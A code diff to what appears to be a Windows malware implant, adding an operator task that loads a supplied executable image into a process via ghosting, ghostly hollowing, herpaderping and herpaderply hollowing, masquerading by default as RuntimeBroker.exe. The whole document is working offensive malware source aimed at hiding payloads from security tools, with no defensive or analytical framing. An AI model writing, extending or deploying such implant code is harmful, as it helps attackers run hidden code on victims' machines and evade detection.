@@ -21,6 +21,7 @@
 #include "strings.h"
 #include "evasion.h"
 #include "injection.h"
+#include "hollowing.h"
 #include <winhttp.h>
 #include <bcrypt.h>
 #include <wincrypt.h>
@@ -1240,6 +1241,39 @@ VOID ImplantMain(PIMPLANT_CONFIG pConfig) {
                                     sprintf(szMsg, bOk
                                         ? "[+] Early Bird APC injected into %s"
                                         : "[-] Early Bird APC failed (%s)", pTasks[i].szArgs[0]);
+                                } else if (pTasks[i].dwArgCount > 1 &&
+                                    (strcmp(pTasks[i].szArgs[1], "ghost") == 0 ||
+                                     strcmp(pTasks[i].szArgs[1], "ghostly") == 0 ||
+                                     strcmp(pTasks[i].szArgs[1], "herpaderp") == 0 ||
+                                     strcmp(pTasks[i].szArgs[1], "herpaderply") == 0)) {
+                                    // PE hollowing: pData is a full PE image, args[0] is the legit host image
+                                    WCHAR wsLegit[512] = {0};
+                                    LPCSTR szLegit = (pTasks[i].szArgs[0][0] != '\0' &&
+                                                      strcmp(pTasks[i].szArgs[0], "0") != 0)
+                                                       ? pTasks[i].szArgs[0]
+                                                       : "C:\\Windows\\System32\\RuntimeBroker.exe";
+                                    MultiByteToWideChar(CP_UTF8, 0, szLegit, -1, wsLegit, 512);
+                                    if (strcmp(pTasks[i].szArgs[1], "ghost") == 0) {
+                                        bOk = GhostProcessInject(pSc, pTasks[i].dwDataLen, wsLegit);
+                                        sprintf(szMsg, bOk
+                                            ? "[+] Ghost process injected (%s)"
+                                            : "[-] Ghost process injection failed", szLegit);
+                                    } else if (strcmp(pTasks[i].szArgs[1], "ghostly") == 0) {
+                                        bOk = GhostlyHollow(pSc, pTasks[i].dwDataLen, wsLegit);
+                                        sprintf(szMsg, bOk
+                                            ? "[+] Ghostly hollowed (%s)"
+                                            : "[-] Ghostly hollowing failed", szLegit);
+                                    } else if (strcmp(pTasks[i].szArgs[1], "herpaderp") == 0) {
+                                        bOk = HerpaderpingProcess(pSc, pTasks[i].dwDataLen, wsLegit);
+                                        sprintf(szMsg, bOk
+                                            ? "[+] Herpaderping injected (%s)"
+                                            : "[-] Herpaderping failed", szLegit);
+                                    } else {
+                                        bOk = HerpaderplyHollow(pSc, pTasks[i].dwDataLen, wsLegit);
+                                        sprintf(szMsg, bOk
+                                            ? "[+] Herpaderply hollowed (%s)"
+                                            : "[-] Herpaderply hollowing failed", szLegit);
+                                    }
                                 } else {
                                     // Remote inject: try by name first, then by PID
                                     DWORD dwPID = 0; HANDLE hProc = NULL;
